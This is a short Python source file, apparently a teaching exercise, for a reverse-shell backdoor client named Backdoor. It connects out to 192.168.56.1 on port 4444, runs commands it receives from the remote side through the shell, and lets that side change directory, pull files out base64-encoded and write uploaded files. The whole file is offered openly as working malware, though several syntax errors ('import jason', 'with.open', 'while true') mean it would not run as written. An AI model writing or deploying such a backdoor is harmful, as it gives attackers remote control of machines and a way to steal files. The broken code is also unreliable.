import subprocess
import socket
import jason
import os
import base64
import sys

class Backdoor:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.connection.connect((ip, port))
		self.connection.send("\n[+] connection established.\n")

	def reliable_send(self, data):
		json_data = json.dumps(data)
		return self.connection.send(json_data)
		
	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
				
			except ValueError:
				continue

	def execute_sys_cmd(self, cmd):
		return subprocess.check_output(cmd, shell=True)
	
	def change_pwd(self, path):
		os.chdir(path)
		return "[+] path changed"

	def read_file(self, path):
		with.open(path, "rb") as file:
			return base64.b64encode(file.read())

	def write_file(self, path, content):
		with.open(path, "wb") as file:
			file.write(content)
			return "[+] upload success"	
		
	def run(self):
		while true:
			
			cmd =self.reliable_receive()
			try:
				if cmd[0] == "exit":
					self.connection.close()
					sys.exit()
				elif cmd[0] == "cd" and len(cmd)>1:
					cmd_result = self.change_pwd(cmd[1])
				elif cmd[0]=="download":
					cmd_result = self.read_file(cmd[1])
				elif cmd[0]=="upload":
					cmd_result= self.write_file(cmd[1], cmd[2])
				else:
					cmd_result = self.execute_sys_cmd(cmd)
				
			except Exception:
				cmd_result="[+] error while executing cmd"
			
			self.reliable_send(cmd_result)
				
		connection.close()
				
client_backdoor= Backdoor("192.168.56.1", 4444)
client_backdoor.run()

